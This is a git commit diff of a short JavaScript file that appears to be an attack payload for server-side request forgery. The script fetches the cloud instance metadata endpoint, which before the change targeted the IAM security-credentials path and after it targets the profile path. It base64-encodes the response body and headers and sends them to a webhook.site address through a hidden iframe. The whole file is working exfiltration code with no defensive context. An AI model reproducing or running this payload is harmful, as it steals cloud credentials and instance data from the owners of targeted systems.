fde66cf4b98219816268aaaba03b9ec67fbf2f72
mhmh55516 <mhmh55516@gmail.com>
2021-04-27 23:33:42 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,13 +1,13 @@
 function reqListener () {
     //var encoded = encodeURI(this.responseText);
-    //var b64 = btoa(this.responseText);
+    var b64 = btoa(this.responseText);
     var raw = btoa(this.getAllResponseHeaders());
     var iframe = document.createElement('iframe');
 	iframe.style.display = "none";
-	iframe.src = "https://webhook.site/95008403-a846-494a-8d4c-70aa6246bcdb/?aa="+raw;
+	iframe.src = "https://webhook.site/95008403-a846-494a-8d4c-70aa6246bcdb/?aa="+b64;
 	document.body.appendChild(iframe);
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "https://169.254.169.254.xip.io/latest/meta-data/iam/security-credentials/"); 
+oReq.open("GET", "https://169.254.169.254.xip.io/latest/meta-data/profile"); 
 oReq.send();
